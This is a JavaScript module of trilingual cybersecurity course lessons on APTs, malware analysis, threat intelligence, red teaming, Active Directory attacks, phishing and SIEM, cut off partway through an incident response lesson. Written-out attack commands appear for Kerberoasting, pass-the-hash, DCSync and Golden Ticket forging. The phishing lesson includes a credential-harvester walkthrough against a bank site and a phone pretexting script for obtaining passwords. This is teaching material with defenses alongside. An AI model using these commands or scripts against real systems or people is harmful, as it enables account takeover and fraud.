// ============================================================
//  LEVEL 4 — SENIOR  (4-oy)
//  4 hafta × 3 dars = 12 dars
// ============================================================
module.exports = [
  // ─── 13-hafta: APT, Malware va Threat Intelligence ───
  {
    id:"c4w13", level:4, week:13, icon:"☠️", color:"#ff2244",
    title:{ uz:"APT, Malware tahlili va Threat Intelligence", ru:"APT, анализ малвари и Threat Intelligence", en:"APT, Malware Analysis and Threat Intelligence" },
    desc:{ uz:"Ilg'or doimiy tahdidlar, malware qanday ishlaydi va zamonaviy razvedka usullari", ru:"Продвинутые постоянные угрозы, как работает малварь и современные методы разведки", en:"Advanced persistent threats, how malware works and modern intelligence methods" },
    duration:{ uz:"3 × 45 daqiqa", ru:"3 × 45 минут", en:"3 × 45 minutes" },
    lessons:[
      {
        id:"c4w13l1",
        title:{ uz:"APT va Kiberhujum zanjiri", ru:"APT и цепочка кибератак", en:"APT and the cyber kill chain" },
        duration:"45 daq",
        content:{
          uz:`<h2>APT — Advanced Persistent Threat</h2>
<p>APT — davlat tomonidan qo'llab-quvvatlanadigan yoki yirik kriminal guruhlar tomonidan amalga oshiriladigan uzoq muddatli, maqsadli hujumlar.</p>
<h3>🌍 Mashhur APT guruhlari</h3>
<div class="info-box">
<p><strong>APT28 (Fancy Bear) — Rossiya:</strong> Siyosiy hujumlar, DNC buzish (2016)</p>
<p><strong>APT29 (Cozy Bear) — Rossiya:</strong> SolarWinds hujumi (2020) — 18,000+ kompaniya zararlandi</p>
<p><strong>Lazarus Group — Shimoliy Koreya:</strong> Bank hujumlari, $1.3 mlrd o'g'irlagan</p>
<p><strong>APT41 — Xitoy:</strong> Josuslik + moliyaviy hujumlar</p>
<p><strong>Equation Group — AQSh (NSA):</strong> Stuxnet (Eron yadrosi)</p>
</div>
<h3>⛓️ Cyber Kill Chain (Lockheed Martin)</h3>
<pre><code>1. RECONNAISSANCE  → Maqsad haqida ma'lumot to'plash
2. WEAPONIZATION   → Exploit + payload tayyorlash
3. DELIVERY        → Email, USB, web orqali yetkazish
4. EXPLOITATION    → Zaiflikdan foydalanish
5. INSTALLATION    → Backdoor/malware o'rnatish
6. C2 (Command & Control) → Hujumchi boshqaruvi
7. ACTIONS ON OBJECTIVES  → Ma'lumot o'g'irlash, zarar</code></pre>
<h3>🔍 MITRE ATT&CK Framework</h3>
<pre><code># ATT&CK Navigator: attack.mitre.org
# Real APT guruhlarga xos TTP lar:

APT29 (Cozy Bear) texnikalar:
- T1566.001: Spearphishing Attachment
- T1059.001: PowerShell
- T1027: Obfuscated Files
- T1071.001: Web Protocols (C2)

# Defensive mapping:
Har bir texnikaga qarshi detection va mitigation!</code></pre>
<h3>🛡️ APT dan himoya</h3>
<ul>
<li><strong>Zero Trust Architecture</strong> — hech kimga ishonma</li>
<li><strong>Network Segmentation</strong> — tarmoqni bo'laklash</li>
<li><strong>Threat Intelligence Feeds</strong> — ma'lum APT IOC lar</li>
<li><strong>EDR (Endpoint Detection and Response)</strong> — CrowdStrike, SentinelOne</li>
<li><strong>User Training</strong> — phishing simulatsiya</li>
</ul>`,
          ru:`<h2>APT — продвинутая постоянная угроза</h2>
<h3>🌍 Известные APT группы</h3>
<div class="info-box">
<p><strong>APT28 (Fancy Bear):</strong> Россия. Взлом DNC (2016)</p>
<p><strong>APT29 (Cozy Bear):</strong> Россия. SolarWinds (2020) — 18 000+ компаний</p>
<p><strong>Lazarus Group:</strong> Северная Корея. $1.3 млрд украдено из банков</p>
</div>
<h3>⛓️ Cyber Kill Chain</h3>
<pre><code>1. Разведка → 2. Создание оружия → 3. Доставка
4. Эксплуатация → 5. Установка → 6. C2 → 7. Цели</code></pre>`,
          en:`<h2>APT — Advanced Persistent Threat</h2>
<h3>🌍 Notable APT groups</h3>
<div class="info-box">
<p><strong>APT28 (Fancy Bear):</strong> Russia. DNC hack (2016)</p>
<p><strong>APT29 (Cozy Bear):</strong> Russia. SolarWinds (2020) — 18,000+ companies</p>
<p><strong>Lazarus Group:</strong> North Korea. $1.3B stolen from banks</p>
</div>
<h3>⛓️ Cyber Kill Chain</h3>
<pre><code>1. Recon → 2. Weaponise → 3. Deliver
4. Exploit → 5. Install → 6. C2 → 7. Act</code></pre>`
        },
        quiz:[
          { q:{uz:"Cyber Kill Chain necha bosqichdan iborat?",ru:"Из скольки этапов состоит Cyber Kill Chain?",en:"How many stages does the Cyber Kill Chain have?"},
            options:{uz:["5","6","7","8"],ru:["5","6","7","8"],en:["5","6","7","8"]}, answer:2 }
        ]
      },
      {
        id:"c4w13l2",
        title:{ uz:"Malware tahlili asoslari", ru:"Основы анализа малвари", en:"Malware analysis basics" },
        duration:"45 daq",
        content:{
          uz:`<h2>Malware Tahlili</h2>
<h3>🦠 Malware turlari</h3>
<div class="info-box">
<p><strong>Virus:</strong> O'zini ko'paytiradi, boshqa fayllarga yuqadi</p>
<p><strong>Worm:</strong> Tarmoq orqali tarqaladi (CodeRed, WannaCry)</p>
<p><strong>Trojan:</strong> Foydali dastur qilgan bo'ladi, orqada yashirinadi</p>
<p><strong>Ransomware:</strong> Fayllarni shifrlaydi, to'lov talab qiladi</p>
<p><strong>Spyware/Keylogger:</strong> Ma'lumot o'g'irlaydi</p>
<p><strong>Rootkit:</strong> Tizimda yashirinib o'z izlarini yo'qotadi</p>
<p><strong>Botnet:</strong> Ko'plab kompyuterlarni boshqaradi (DDoS uchun)</p>
</div>
<h3>🔬 Statik Tahlil</h3>
<pre><code># Malware ni ishga tushirmasdan tekshirish:

# Hash olish (VirusTotal da tekshirish):
md5sum malware.exe
sha256sum malware.exe
# virustotal.com → hash yuklash

# Strings — o'qiladigan matn:
strings malware.exe | grep -i "http"
strings malware.exe | grep -i "password"
strings malware.exe | grep -i "registry"

# PE tahlil (Windows fayl):
pecheck malware.exe
# Importlar: qaysi API chaqiriladi?
# CreateRemoteThread → kod inject
# RegSetValue → registry yozish
# WinExec → buyruq bajarish</code></pre>
<h3>🔧 Dinamik Tahlil</h3>
<pre><code># Malware ni izolyatsiyada ishga tushirish:
# Cuckoo Sandbox (avtomatik):
cuckoo submit malware.exe

# Qo'lda:
# 1. VM ni snapshot qiling (qaytish uchun)
# 2. Process Monitor (Sysinternals) yoqing
# 3. Wireshark yoqing
# 4. Malware ni ishga tushiring
# 5. O'zgarishlarni kuzating:
#    - Qaysi fayllar yaratildi/o'zgartirildi?
#    - Registry da nima o'zgardi?
#    - Qaysi tarmoq ulanishlari bo'ldi?</code></pre>
<h3>🔍 Any.run, Hybrid Analysis</h3>
<pre><code># Onlayn sandbox (xavfsiz!):
app.any.run          → interaktiv sandbox
hybrid-analysis.com  → bepul, batafsil
joesandbox.com       → professional

# IOC lar (Indicators of Compromise):
- IP/domen (C2 server)
- Hash (faylning imzosi)
- Registry key
- File path / name
- Mutex / Named pipe</code></pre>`,
          ru:`<h2>Анализ малвари</h2>
<h3>🦠 Типы малвари</h3>
<div class="info-box">
<p><strong>Ransomware:</strong> Шифрует файлы, требует выкуп</p>
<p><strong>Trojan:</strong> Притворяется полезной программой</p>
<p><strong>Botnet:</strong> Управляет множеством компьютеров (DDoS)</p>
</div>
<h3>🔬 Статический анализ</h3>
<pre><code>sha256sum malware.exe → virustotal.com
strings malware.exe | grep -i "http"
strings malware.exe | grep -i "password"</code></pre>
<h3>🔧 Динамический анализ</h3>
<pre><code># Cuckoo Sandbox:
cuckoo submit malware.exe

# Онлайн:
app.any.run
hybrid-analysis.com</code></pre>`,
          en:`<h2>Malware Analysis</h2>
<h3>🦠 Malware types</h3>
<div class="info-box">
<p><strong>Ransomware:</strong> Encrypts files, demands ransom</p>
<p><strong>Trojan:</strong> Disguises as a useful program</p>
<p><strong>Botnet:</strong> Controls many computers (DDoS)</p>
</div>
<h3>🔬 Static analysis</h3>
<pre><code>sha256sum malware.exe → virustotal.com
strings malware.exe | grep -i "http"
strings malware.exe | grep -i "password"</code></pre>
<h3>🔧 Dynamic analysis</h3>
<pre><code># Cuckoo Sandbox:
cuckoo submit malware.exe

# Online:
app.any.run
hybrid-analysis.com</code></pre>`
        },
        quiz:[
          { q:{uz:"Ransomware nima qiladi?",ru:"Что делает ransomware?",en:"What does ransomware do?"},
            options:{uz:["Tarmoqni o'chiradi","Fayllarni shifrlaydi va to'lov talab qiladi","Parollarni o'chiradi","Internetni sekinlashtiradi"],ru:["Выключает сеть","Шифрует файлы и требует выкуп","Удаляет пароли","Замедляет интернет"],en:["Shuts down network","Encrypts files and demands ransom","Deletes passwords","Slows internet"]}, answer:1 }
        ]
      },
      {
        id:"c4w13l3",
        title:{ uz:"Threat Intelligence va IOC", ru:"Threat Intelligence и IOC", en:"Threat Intelligence and IOC" },
        duration:"40 daq",
        content:{
          uz:`<h2>Threat Intelligence va IOC</h2>
<h3>🧠 Threat Intelligence nima?</h3>
<p>Threat Intelligence — hujumchilar, usullari va maqsadlari haqida ma'lumot to'plash va tahlil qilish. "Dushmanini bil!"</p>
<div class="info-box">
<p><strong>Strategic TI:</strong> Rahbariyat uchun — umumiy tahdid manzarasi, sanoat tendensiyalari</p>
<p><strong>Tactical TI:</strong> Xavfsizlik jamoasi uchun — TTP (Taktika, Texnika, Protsedura)</p>
<p><strong>Operational TI:</strong> Aniq hujum kampaniyalari haqida</p>
<p><strong>Technical TI:</strong> IOC lar — IP, hash, domen, imzo</p>
</div>
<h3>🔑 IOC — Komprometatsiya ko'rsatkichlari</h3>
<pre><code># IOC turlari va tekshirish:

# 1. File Hash:
sha256sum suspicious_file
→ virustotal.com da tekshiring

# 2. IP / Domen:
whois 192.168.1.1
nslookup malicious.com
→ shodan.io, abuseipdb.com, urlvoid.com

# 3. URL:
→ urlscan.io, virustotal.com/gui/url

# 4. Email header:
→ mxtoolbox.com/EmailHeaders.aspx</code></pre>
<h3>🌐 TI platformalari va tavasiyalar</h3>
<pre><code># Bepul:
OTX (AlienVault)  → otx.alienvault.com
MISP              → bepul, open source platform
Abuse.ch          → malware, botnet IOC
Threatfox         → IOC bazasi
URLhaus           → zararli URL lar

# Tijorat:
Recorded Future, Mandiant, CrowdStrike Intel

# STIX/TAXII — standart format:
# Threat intelligence almashinuvi uchun</code></pre>
<h3>🔍 TI dan foydalanish — amaliy</h3>
<pre><code># Log da shubhali IP topildi: 185.220.101.45
# Tekshiramiz:

1. abuseipdb.com: Abuse Score: 100% (Tor exit node)
2. shodan.io: Port 443, 1194 (OpenVPN), Tor relay
3. OTX: 50+ IoC ro'yxatda

# Qaror: BLOK + incident ochish + log tahlil

# SIEM da avtomatik:
# IOC feed → Elasticsearch → alert

index=firewall
| where src_ip in [threat_intel_ips]
| table _time, src_ip, dest_ip, action</code></pre>`,
          ru:`<h2>Threat Intelligence и IOC</h2>
<h3>🧠 Виды Threat Intelligence</h3>
<div class="info-box">
<p><strong>Strategic:</strong> Для руководства — общая картина угроз</p>
<p><strong>Tactical:</strong> TTP — Тактики, Техники, Процедуры</p>
<p><strong>Technical:</strong> IOC — IP, хеш, домен, сигнатура</p>
</div>
<h3>🌐 Платформы TI</h3>
<pre><code># Бесплатные:
OTX AlienVault  → otx.alienvault.com
Threatfox       → IOC база
URLhaus         → вредоносные URL
Abuse.ch        → малварь, ботнеты</code></pre>`,
          en:`<h2>Threat Intelligence and IOC</h2>
<h3>🧠 Types of Threat Intelligence</h3>
<div class="info-box">
<p><strong>Strategic:</strong> For leadership — overall threat landscape</p>
<p><strong>Tactical:</strong> TTPs — Tactics, Techniques, Procedures</p>
<p><strong>Technical:</strong> IOCs — IPs, hashes, domains, signatures</p>
</div>
<h3>🌐 TI platforms</h3>
<pre><code># Free:
OTX AlienVault  → otx.alienvault.com
Threatfox       → IOC database
URLhaus         → malicious URLs
Abuse.ch        → malware, botnets</code></pre>`
        },
        quiz:[
          { q:{uz:"IOC (Indicator of Compromise) misollari?",ru:"Примеры IOC (индикаторов компрометации)?",en:"Examples of IOC (Indicators of Compromise)?"},
            options:{uz:["Foydalanuvchi nomi va parol","IP manzil, fayl hash, zararli domen","Brauzer versiyasi","Monitor o'lchami"],ru:["Имя пользователя и пароль","IP адрес, хеш файла, вредоносный домен","Версия браузера","Размер монитора"],en:["Username and password","IP address, file hash, malicious domain","Browser version","Monitor size"]}, answer:1 }
        ]
      }
    ]
  },

  // ─── 14-hafta: Red Team Operatsiyalari ───
  {
    id:"c4w14", level:4, week:14, icon:"🔴", color:"#ff0000",
    title:{ uz:"Red Team Operatsiyalari", ru:"Операции Red Team", en:"Red Team Operations" },
    desc:{ uz:"Professional Red Team metodologiyasi, C2 framework lar va ijtimoiy muhandislik", ru:"Профессиональная методология Red Team, C2 фреймворки и социальная инженерия", en:"Professional Red Team methodology, C2 frameworks and social engineering" },
    duration:{ uz:"3 × 45 daqiqa", ru:"3 × 45 минут", en:"3 × 45 minutes" },
    lessons:[
      {
        id:"c4w14l1",
        title:{ uz:"Red Team vs Blue Team vs Purple Team", ru:"Red Team vs Blue Team vs Purple Team", en:"Red Team vs Blue Team vs Purple Team" },
        duration:"45 daq",
        content:{
          uz:`<h2>Red Team, Blue Team va Purple Team</h2>
<h3>🔴 Red Team — Hujumchilar roli</h3>
<div class="info-box">
<p>Red Team — real hujumchilarni simulyatsiya qiladigan professional guruh. Oddiy pen-testdan farqi: maqsad flag topish emas, tashkilotning himoyasini sinovdan o'tkazish.</p>
<p><strong>Red Team operatsiyasi:</strong> Haftalab/oylab davom etadi. Real APT texnikalardan foydalanadi.</p>
</div>
<h3>🔵 Blue Team — Himoyachilar</h3>
<div class="info-box">
<p>Blue Team — tashkilotning ichki xavfsizlik jamoasi. SIEM, EDR, IDS bilan monitoring. Hujumni aniqlash va to'xtatish.</p>
<p><strong>SOC (Security Operations Center):</strong> 24/7 monitoring markazi.</p>
</div>
<h3>💜 Purple Team — Hamkorlik</h3>
<p>Red va Blue jamoalar birgalikda ishlaydi — real vaqtda hujum va himoya simulyatsiyasi. Samarali o'rganish usuli.</p>
<h3>🎯 Red Team operatsiya bosqichlari</h3>
<pre><code>1. Planning (Rejalash)
   - Scope kelishish
   - Threat modeling (kim hujum qilishi mumkin?)
   - Stsenariy tanlash

2. Recon (Razvedka)
   - OSINT, LinkedIn, GitHub
   - Phishing domenlarini ro'yxatdan o'tkazish

3. Initial Access (Dastlabki kirish)
   - Phishing kampaniya
   - Zaif tashqi xizmat
   - Jismoniy kirish (agar doirada)

4. C2 (Command & Control) o'rnatish
   - Cobalt Strike, Havoc, Sliver

5. Lateral Movement
   - Pass-the-Hash, Kerberoasting
   - BloodHound bilan AD tahlil

6. Objective yakunlash
   - Flag topish (ma'lumot o'g'irlash simulyatsiya)

7. Reporting + Purple Team sessiyasi</code></pre>
<h3>🛠️ C2 Framework lar</h3>
<div class="info-box">
<p><strong>Cobalt Strike:</strong> Eng mashhur tijoriy C2. $5,000+/yil. APT guruhlari ham ishlatadi.</p>
<p><strong>Havoc C2:</strong> Bepul, zamonaviy, Cobalt Strike alternativasi</p>
<p><strong>Sliver:</strong> Go tilida yozilgan, bepul, kuchli</p>
<p><strong>Mythic:</strong> Kengaytiriladigan C2 platform</p>
</div>`,
          ru:`<h2>Red Team, Blue Team и Purple Team</h2>
<h3>🔴 Red Team</h3>
<div class="info-box">
<p>Профессиональная группа, симулирующая реальных атакующих. Длится неделями/месяцами. Использует реальные APT техники.</p>
</div>
<h3>🔵 Blue Team</h3>
<div class="info-box">
<p>Внутренняя команда безопасности организации. SIEM, EDR, IDS мониторинг. SOC (Security Operations Center): 24/7.</p>
</div>
<h3>🎯 Этапы Red Team операции</h3>
<pre><code>1. Планирование → 2. Разведка → 3. Первичный доступ
4. C2 → 5. Lateral Movement → 6. Цель → 7. Отчёт</code></pre>`,
          en:`<h2>Red Team, Blue Team and Purple Team</h2>
<h3>🔴 Red Team</h3>
<div class="info-box">
<p>Professional group simulating real attackers. Lasts weeks/months. Uses actual APT techniques.</p>
</div>
<h3>🔵 Blue Team</h3>
<div class="info-box">
<p>Organisation's internal security team. SIEM, EDR, IDS monitoring. SOC (Security Operations Center): 24/7.</p>
</div>
<h3>🎯 Red Team operation stages</h3>
<pre><code>1. Planning → 2. Recon → 3. Initial Access
4. C2 → 5. Lateral Movement → 6. Objective → 7. Report</code></pre>`
        },
        quiz:[
          { q:{uz:"Purple Team nima?",ru:"Что такое Purple Team?",en:"What is a Purple Team?"},
            options:{uz:["Faqat hujumchilar","Faqat himoyachilar","Red va Blue jamoalar birgalikda ishlaydigan format","Boshqaruv jamoasi"],ru:["Только атакующие","Только защитники","Формат совместной работы Red и Blue команд","Команда управления"],en:["Attackers only","Defenders only","Red and Blue teams working together","Management team"]}, answer:2 }
        ]
      },
      {
        id:"c4w14l2",
        title:{ uz:"Active Directory hujumlar", ru:"Атаки на Active Directory", en:"Active Directory attacks" },
        duration:"45 daq",
        content:{
          uz:`<h2>Active Directory Hujumlar</h2>
<p>Korporativ tarmoqlarning 90%+ da Active Directory ishlatiladi. AD buzilsa — butun kompaniya buzilgan!</p>
<h3>🏢 Active Directory asoslari</h3>
<div class="info-box">
<p><strong>Domain Controller (DC):</strong> AD ning markazi serveri. Barcha autentifikatsiya orqali o'tadi.</p>
<p><strong>LDAP:</strong> AD ma'lumotlarini so'rash protokoli</p>
<p><strong>Kerberos:</strong> AD autentifikatsiya protokoli</p>
<p><strong>SMB:</strong> Windows fayl ulashish</p>
</div>
<h3>🔍 BloodHound — AD tahlili</h3>
<pre><code># BloodHound — grafik AD tahlil:
# DCdan ma'lumot to'plash:
SharpHound.exe -c all

# BloodHound da ko'rish:
# "Find Shortest Paths to Domain Admins"
# "Find All Domain Admins"
# "Shortest Path from Owned Principals"

# Zaifliklari:
# Kerberoastable accounts
# AS-REP Roastable
# Unconstrained Delegation</code></pre>
<h3>⚔️ Asosiy AD Hujumlar</h3>
<pre><code># 1. Kerberoasting:
# Service account hash olish (SYSTEM shart emas):
GetUserSPNs.py -request domain/user:pass
hashcat -m 13100 kerberoast.hash wordlist.txt

# 2. AS-REP Roasting:
# Pre-auth o'chirilgan hisoblar:
GetNPUsers.py domain/ -usersfile users.txt -no-pass
hashcat -m 18200 asrep.hash wordlist.txt

# 3. Pass-the-Hash:
# NTLM hash bilan autentifikatsiya (parolsiz!):
evil-winrm -i 192.168.1.10 -u admin -H ntlmhash

# 4. DCSync:
# Barcha parol hashlarini olish (Domain Admin kerak):
secretsdump.py domain/admin:pass@dc.domain.com

# 5. Golden Ticket:
# KRBTGT hashi bilan cheksiz Kerberos ticket:
ticketer.py -nthash krbtgt_hash -domain-sid S-1-5-21-... -domain domain.com Administrator</code></pre>
<h3>🛡️ AD Himoya</h3>
<ul>
<li><strong>Tiered Admin Model</strong> — admin hisoblarni ajratish</li>
<li><strong>LAPS</strong> — mahalliy admin parolni avtomatik yangilash</li>
<li><strong>Protected Users Group</strong> — VIP hisoblar</li>
<li><strong>PAW (Privileged Access Workstation)</strong> — admin ish stantsiyasi</li>
<li><strong>Microsoft Defender for Identity</strong> — AD monitoring</li>
</ul>`,
          ru:`<h2>Атаки на Active Directory</h2>
<h3>⚔️ Основные атаки AD</h3>
<pre><code># Kerberoasting:
GetUserSPNs.py -request domain/user:pass
hashcat -m 13100 kerberoast.hash wordlist.txt

# Pass-the-Hash:
evil-winrm -i 192.168.1.10 -u admin -H ntlmhash

# DCSync (получить все хеши):
secretsdump.py domain/admin:pass@dc.domain.com</code></pre>
<h3>🔍 BloodHound</h3>
<pre><code>SharpHound.exe -c all
# Визуализация путей к Domain Admin</code></pre>`,
          en:`<h2>Active Directory attacks</h2>
<h3>⚔️ Core AD attacks</h3>
<pre><code># Kerberoasting:
GetUserSPNs.py -request domain/user:pass
hashcat -m 13100 kerberoast.hash wordlist.txt

# Pass-the-Hash:
evil-winrm -i 192.168.1.10 -u admin -H ntlmhash

# DCSync (get all hashes):
secretsdump.py domain/admin:pass@dc.domain.com</code></pre>
<h3>🔍 BloodHound</h3>
<pre><code>SharpHound.exe -c all
# Visualise paths to Domain Admin</code></pre>`
        },
        quiz:[
          { q:{uz:"Kerberoasting hujumida nima olinadi?",ru:"Что получают в атаке Kerberoasting?",en:"What is obtained in a Kerberoasting attack?"},
            options:{uz:["Ochiq parol","Service account Kerberos ticket hash — oflayn buzilishi mumkin","Root shell","Domain controller IP"],ru:["Открытый пароль","Хеш Kerberos тикета сервисного аккаунта — можно взломать офлайн","Root shell","IP контроллера домена"],en:["Plain-text password","Service account Kerberos ticket hash — can be cracked offline","Root shell","Domain controller IP"]}, answer:1 }
        ]
      },
      {
        id:"c4w14l3",
        title:{ uz:"Ijtimoiy Muhandislik va Phishing", ru:"Социальная инженерия и фишинг", en:"Social Engineering and Phishing" },
        duration:"40 daq",
        content:{
          uz:`<h2>Ijtimoiy Muhandislik va Phishing</h2>
<p>"Texnologiyani hacklashdan ko'ra odamni hacklash osonroq." — Kevin Mitnick</p>
<h3>🎭 Ijtimoiy muhandislik texnikalari</h3>
<div class="info-box">
<p><strong>Phishing:</strong> Soxta email — ko'pchilikka yuboriladi</p>
<p><strong>Spear Phishing:</strong> Maqsadli — aniq shaxsga, shaxsiylashtirilgan</p>
<p><strong>Whaling:</strong> CEO, CFO kabi yuqori mansablilarga</p>
<p><strong>Vishing:</strong> Telefon orqali firib</p>
<p><strong>Smishing:</strong> SMS orqali phishing</p>
<p><strong>Pretexting:</strong> Soxta identitet — "IT xodimiman, parolingizni yangilashim kerak"</p>
<p><strong>Baiting:</strong> USB flash disk qoldirish ("KOMPANIYA SIRI" yorlig'i bilan)</p>
</div>
<h3>🛠️ Red Team phishing vositalar</h3>
<pre><code># GoPhish — phishing kampaniya:
gophish

# Sozlash:
1. Email template yaratish
2. Soxta sahifa yaratish (credential harvest)
3. Targetlarni yuklash (email list)
4. Kampaniya boshlash
5. Real vaqt statistika:
   - Nechta email ochildi?
   - Nechta havola bosildi?
   - Nechta parol kiritildi?

# Evilginx3 — MITM phishing (2FA bypass):
# Haqiqiy sayt old da turib tokenni ushlash
# Proxy phishing — haqiqiy session olinadi!</code></pre>
<h3>🧰 SET (Social Engineering Toolkit)</h3>
<pre><code">setoolkit

1) Social-Engineering Attacks
   → 2) Website Attack Vectors
      → 3) Credential Harvester
         → Enter target URL: https://bank.com
         # Soxta bank sahifasi yaratildi!
         # IP manzilingizni email'ga yuboring

# Telefon orqali pretexting skripti:
"Salom, men IT bo'limidan qo'ng'iroq qilyapman.
 Tizimimiz yangilanmoqda, parolingizni tasdiqlashim kerak.
 Xavotir olmang, bu xavfsiz protsedura..."</code></pre>
<h3>🛡️ Phishing dan himoya</h3>
<ul>
<li><strong>Email filtri:</strong> Spam, SPF, DKIM, DMARC</li>
<li><strong>Xodimlarni o'qitish:</strong> Phishing simulatsiya (KnowBe4)</li>
<li><strong>2FA:</strong> Parol o'g'irlansa ham kirish qiyin</li>
<li><strong>FIDO2/Passkey:</strong> Phishing ga chidamli autentifikatsiya</li>
<li><strong>URL tekshirish:</strong> Hover qiling — haqiqiy URL ko'rinadi</li>
</ul>`,
          ru:`<h2>Социальная инженерия и фишинг</h2>
<h3>🎭 Техники социальной инженерии</h3>
<div class="info-box">
<p><strong>Phishing:</strong> Массовая поддельная рассылка</p>
<p><strong>Spear Phishing:</strong> Целевой — конкретному человеку</p>
<p><strong>Vishing:</strong> Звонки по телефону</p>
<p><strong>Pretexting:</strong> "Я из IT, нужно обновить пароль"</p>
<p><strong>Baiting:</strong> Оставить USB флешку ("СЕКРЕТЫ КОМПАНИИ")</p>
</div>
<h3>🛠️ GoPhish</h3>
<pre><code># Phishing кампания:
1. Email шаблон
2. Поддельная страница (credential harvest)
3. Список целей
4. Запуск кампании
5. Статистика: открыто / кликнуто / введён пароль</code></pre>`,
          en:`<h2>Social Engineering and Phishing</h2>
<h3>🎭 Social engineering techniques</h3>
<div class="info-box">
<p><strong>Phishing:</strong> Mass fake emails</p>
<p><strong>Spear Phishing:</strong> Targeted — personalised to specific person</p>
<p><strong>Vishing:</strong> Phone calls</p>
<p><strong>Pretexting:</strong> "I'm from IT, need to update your password"</p>
<p><strong>Baiting:</strong> Drop a USB drive ("COMPANY SECRETS" label)</p>
</div>
<h3>🛠️ GoPhish</h3>
<pre><code># Phishing campaign:
1. Email template
2. Fake page (credential harvest)
3. Target list
4. Launch campaign
5. Stats: opened / clicked / submitted password</code></pre>`
        },
        quiz:[
          { q:{uz:"'Spear Phishing' oddiy phishing dan farqi?",ru:"Чем 'Spear Phishing' отличается от обычного фишинга?",en:"How does 'Spear Phishing' differ from regular phishing?"},
            options:{uz:["Tezroq","Ko'pchilikka","Aniq shaxsga shaxsiylashtirilgan — maqsadli hujum","Faqat email orqali"],ru:["Быстрее","Массовая рассылка","Персонализированный конкретному человеку — целевая атака","Только по email"],en:["Faster","Mass-sent","Personalised to a specific person — targeted attack","Email only"]}, answer:2 }
        ]
      }
    ]
  },

  // ─── 15-hafta: Blue Team va SOC ───
  {
    id:"c4w15", level:4, week:15, icon:"🔵", color:"#0088ff",
    title:{ uz:"Blue Team va SOC Operatsiyalari", ru:"Операции Blue Team и SOC", en:"Blue Team and SOC Operations" },
    desc:{ uz:"SIEM, log tahlili, incident response va raqamli kriminalistika", ru:"SIEM, анализ логов, реагирование на инциденты и цифровая криминалистика", en:"SIEM, log analysis, incident response and digital forensics" },
    duration:{ uz:"3 × 45 daqiqa", ru:"3 × 45 минут", en:"3 × 45 minutes" },
    lessons:[
      {
        id:"c4w15l1",
        title:{ uz:"SIEM va Log tahlili", ru:"SIEM и анализ логов", en:"SIEM and log analysis" },
        duration:"45 daq",
        content:{
          uz:`<h2>SIEM va Log Tahlili</h2>
<h3>🖥️ SIEM nima?</h3>
<p>SIEM (Security Information and Event Management) — barcha tizimlardan log larni to'plash, korrelyatsiya qilish va ogohlantirishlar yaratish tizimi.</p>
<div class="info-box">
<p><strong>ELK Stack (bepul):</strong> Elasticsearch + Logstash + Kibana</p>
<p><strong>Splunk:</strong> Eng mashhur enterprise SIEM</p>
<p><strong>Microsoft Sentinel:</strong> Cloud-native, Azure</p>
<p><strong>QRadar (IBM):</strong> Enterprise</p>
<p><strong>Wazuh (bepul):</strong> Open source, kuchli</p>
</div>
<h3>📊 Splunk bilan ishlash</h3>
<pre><code># Asosiy Splunk SPL (Search Processing Language):

# Barcha loginlar:
index=windows EventCode=4624

# Muvaffaqiyatsiz loginlar:
index=windows EventCode=4625

# Top 10 muvaffaqiyatsiz login manzillari:
index=windows EventCode=4625
| stats count by src_ip
| sort -count
| head 10

# Brute force aniqlash (5 daqiqada 10+ xato):
index=windows EventCode=4625
| bucket span=5m _time
| stats count by _time, src_ip
| where count > 10

# PowerShell ishlatish:
index=windows EventCode=4104 CommandLine="*Invoke-*"
| table _time, ComputerName, CommandLine</code></pre>
<h3>🚨 Alert (Ogohlantirish) qoidalari</h3>
<pre><code># SIGMA qoidasi (standart format):
title: Brute Force Login Attempt
status: stable
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4625
  timeframe: 5m
  condition: selection | count() > 10
falsepositives:
  - Forgotten password
level: medium</code></pre>
<h3>🔍 Log lar qayerda?</h3>
<pre><code># Linux:
/var/log/syslog        → umumiy
/var/log/auth.log      → autentifikatsiya
/var/log/apache2/      → web server
/var/log/nginx/        → nginx
/var/log/fail2ban.log  → bloklangan IP lar

# Windows (Event Viewer):
Security.evtx  → login, privilege
System.evtx    → tizim hodisalar
Application.evtx → dastur hodisalar
PowerShell/Operational → PS aktivlik</code></pre>`,
          ru:`<h2>SIEM и анализ логов</h2>
<h3>📊 Splunk SPL запросы</h3>
<pre><code># Все входы:
index=windows EventCode=4624

# Неудачные входы:
index=windows EventCode=4625

# Топ 10 IP неудачных входов:
index=windows EventCode=4625
| stats count by src_ip | sort -count | head 10

# Обнаружение Brute Force:
index=windows EventCode=4625
| bucket span=5m _time
| stats count by _time, src_ip
| where count > 10</code></pre>`,
          en:`<h2>SIEM and log analysis</h2>
<h3>📊 Splunk SPL queries</h3>
<pre><code># All logins:
index=windows EventCode=4624

# Failed logins:
index=windows EventCode=4625

# Top 10 failed login IPs:
index=windows EventCode=4625
| stats count by src_ip | sort -count | head 10

# Brute Force detection:
index=windows EventCode=4625
| bucket span=5m _time
| stats count by _time, src_ip
| where count > 10</code></pre>`
        },
        quiz:[
          { q:{uz:"Windows Event ID 4625 nima?",ru:"Что такое Windows Event ID 4625?",en:"What is Windows Event ID 4625?"},
            options:{uz:["Muvaffaqiyatli login","Muvaffaqiyatsiz login urinishi","Yangi hisob yaratildi","Xizmat o'rnatildi"],ru:["Успешный вход","Неудачная попытка входа","Создан новый аккаунт","Установлена служба"],en:["Successful login","Failed login attempt","New account created","Service installed"]}, answer:1 }
        ]
      },
      {
        id:"c4w15l2",
        title:{ uz:"Incident Response (IR)", ru:"Реагирование на инциденты (IR)", en:"Incident Response (IR)" },
        duration:"45 daq",
        content:{
          uz:`<h2>Incident Response — Hodisalarga Javob Berish</h2>
<h3>📋 IR Jarayon — NIST SP 800-61</h3>
<pre><code">1. PREPARATION (Tayyorlanish)
   - IR reja yozish
   - Jamoa tuzish
   - Vositalar tayyorlash
   - Training va simulatsiya

2. IDENTIFICATION (Aniqlash)
   - Hodisa bormi? (Yolg'on signal?)
   - Hodisani tasniflash: P1/P2/P3
   - Timeline yaratish
   - IOC to'plash

3. CONTAINMENT (Cheklash)
   - Qisqa muddatli: Zararli tizimni izolyatsiya
   - Uzoq muddatli: Himoya kuchaytirish
   - Forensic nusxa olish (o'chirib yubormaslik!)

4. ERADICATION (Yo'qotish)
   - Malware o'chirish
   - Zaiflikni yopish
   - Backdoor tozalash
   - Parollarni almashtirish

5. RECOVERY (Tiklash)
   - Tizimni backup dan tiklash
   - Monitoring kuchaytirish
   - Bosqichma-bosqich ishga qaytarish

6. LESSONS LEARNED (Xulosa)
   - Post-incident hisobot
